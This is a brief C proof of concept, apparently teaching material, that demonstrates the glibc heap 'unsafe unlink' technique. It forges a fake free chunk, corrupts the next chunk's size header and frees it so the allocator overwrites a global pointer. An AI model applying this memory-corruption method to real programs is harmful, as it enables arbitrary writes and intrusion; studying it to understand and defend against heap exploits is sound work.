#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#include<stdio.h>

unsigned long *target;
int main()
{
	unsigned long *p0,*p1;
	p0=malloc(0xa0);
	p1=malloc(0xa0);
	target=p0;
	*(target+0)=0;
	*(target+1)=0xa0;
	*(target+2)=(unsigned long)(&target-3);
	*(target+3)=(unsigned long)(&target-2);
	*(target+4)=0x0;
	p1[-2]=0xa0;
	p1[-1]=0xb0;
	free(p1);
	printf("Target @ %p = %#lx\n",&target,target);
}
